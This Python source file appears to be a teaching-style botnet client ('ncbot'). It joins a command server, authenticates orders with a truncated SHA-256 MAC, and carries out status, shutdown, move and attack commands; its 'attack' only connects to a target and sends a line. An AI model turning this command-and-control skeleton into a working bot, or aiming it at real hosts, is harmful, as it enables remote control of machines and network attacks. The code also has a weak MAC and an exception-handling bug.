

import argparse
import socket
import time
from cryptography.hazmat.primitives import hashes
import signal
import sys

def signal_handler(sig, frame):
    print(' exiting...')
    sys.exit(0)


def parse_args():
    parser = argparse.ArgumentParser(
        prog='ncbot',
        description='bot',
    )
    parser.add_argument('hostname_and_port', help='hostname and port')
    parser.add_argument('nick', help='the nickname for the bot')
    parser.add_argument('secret', help='secret')
    return parser.parse_args()

def authenticate_cmd(nonce, mac, secret):
    if nonce in seen_nonces:
        print("This nonce has been seen before")
        return False
    else:
        print('authenticating...')
        seen_nonces.append(nonce)
        sha256_hash = hashes.Hash(hashes.SHA256())
        sha256_hash.update((nonce + secret).encode())
        mac2 = sha256_hash.finalize().hex()
        print(f'compare mac: {mac}, with mac2: {mac2[:8]}')
        if (mac == mac2[:8]):
            print("authentication successfull")
            return True
    return False

def execute_attack_cmd(hostname, port, nick, nonce, sock):
    try:
        print("connecting to target...")
        target_sock = socket.create_connection((hostname,port), timeout=3)
        print("connnected to target server")
        attack_msg = f'{nick} {nonce}\n'
        target_sock.sendall(attack_msg.encode())
        print("attack message sent. Closing connection to attack target...")
        target_sock.close()
        res_msg = f'-attack {nick} OK'
        sock.sendall(res_msg.encode())
        # <nonce> <mac> <command> <argument1> <argument2>
    except socket.timeout:
        print("Connection timed out")
        res_msg = f'-attack {nick} FAIL timeout'
        sock.sendall(res_msg.encode())
    except ConnectionRefusedError:
        print('connection refused')
        res_msg = f'-attack {nick} FAIL connection refused'
        sock.sendall(res_msg.encode())
    except Exception as e:
        print(e)
        res_msg = f'-attack {nick} FAIL' + e
        sock.sendall(res_msg.encode())
    return True

def execute_move_cmd(hostname, port, nick, sock, secret):
    msg = f'-move {nick}\n'
    sock.sendall(msg.encode())
    sock.close()
    return True, [hostname, port]
    

def execute_cmd(msg, nick, sock, num_cmds_executed, secret):
    cmd = msg[2]
    match cmd:
        case "status":
            msg = f'-status {nick} {num_cmds_executed + 1}\n'
            sock.sendall(msg.encode())
            print("status sent")
            return True, []
        case "shutdown":
            msg = f'-shutdown {nick}\n'
            print("shutting down...")
            sock.sendall(msg.encode())
            sock.shutdown(socket.SHUT_WR)
            sock.close()
            sys.exit()
        case "attack":
            if (len(msg) <= 3):
                print("invalid number of args. <hotname>:<port> expected")
                return False, []
            hostname, port = msg[3].split(':')
            return execute_attack_cmd(hostname, port, nick, msg[0], sock), []
        case "move":
            if (len(msg) <= 3):
                print("invalid number of args. <hotname>:<port> expected")
                return False, []
            hostname, port = msg[3].split(':')
            return execute_move_cmd(hostname, port, nick, sock, secret)
        case _:
            print("command not recognized")
            return False, []

def start_bot(hostname, port, nick, secret):
    num_cmds_executed = 0
    while(True): 
        try:
            sock = socket.create_connection((hostname,port), timeout=30)
            print("Connected to", hostname, port)
            join_msg = f'-joined {nick}\n'
            sock.sendall(join_msg.encode())
            # <nonce> <mac> <command> <argument1> <argument2>
            while (True):
                msg = sock.recv(1024).decode('ascii').split()
                print(f"received: {msg}")
                if len(msg) >= 3 and authenticate_cmd(msg[0], msg[1], secret):
                    print(f'executing {msg[2]} command...')
                    res, args = execute_cmd(msg, nick, sock, num_cmds_executed, secret)
                    if res:
                        num_cmds_executed += 1
                        if len(args) > 0:
                            print("args", args)
                            hostname, port = args
                            print("hostname and port: ", hostname, port)
                else:
                    print('message ignored')
        except socket.timeout:
            print("Connection timed out. Attempting to reconnect...")
        except Exception as e:
            print(e)
        time.sleep(5)


        
seen_nonces = []


def main():
    signal.signal(signal.SIGINT, signal_handler)
    args = parse_args()
    print(args.hostname_and_port)
    hostname, port = args.hostname_and_port.split(':')
    start_bot(hostname, port, args.nick, args.secret)


if __name__ == "__main__":
    main()